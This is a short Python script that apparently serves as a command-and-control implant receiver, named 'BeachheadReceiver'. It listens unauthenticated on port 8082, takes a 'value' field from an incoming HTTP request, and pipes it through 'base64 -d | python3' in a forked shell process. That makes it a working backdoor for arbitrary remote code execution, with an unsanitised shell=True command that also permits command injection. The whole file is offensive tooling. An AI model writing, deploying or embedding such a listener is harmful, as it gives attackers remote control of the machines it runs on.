import socket
import urllib.parse
import subprocess
import os


class BeachheadReceiver:
    HOST = ''
    PORT = 8082
    
    def __init__(self):
        pass

    def accept_connection(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind((self.HOST, self.PORT))
        sock.listen(1)
        conn, addr = sock.accept()

        data = b''
        while True:
            data_in = conn.recv(1024)
            data += data_in
            if len(data_in) < 1024:
                break
        sock.close()

        return data

    def parse_cnc(self, data):
        data = data.decode('utf-8')
        data = data.split('\r\n\r\n')
        data = data[1].split('&')
        for d in data:
            if 'value' in d:
                d = d.split('=', 1)
                return urllib.parse.unquote(d[1])

    def execute_cnc(self, implant):
        command = "echo " + implant + " | base64 -d | python3"
        pid = os.fork()
        if pid == 0:
            subprocess.Popen(command, shell=True)


if __name__ == "__main__":
    receiver = BeachheadReceiver()
    data = receiver.accept_connection()
    implant = receiver.parse_cnc(data)
    receiver.execute_cnc(implant)
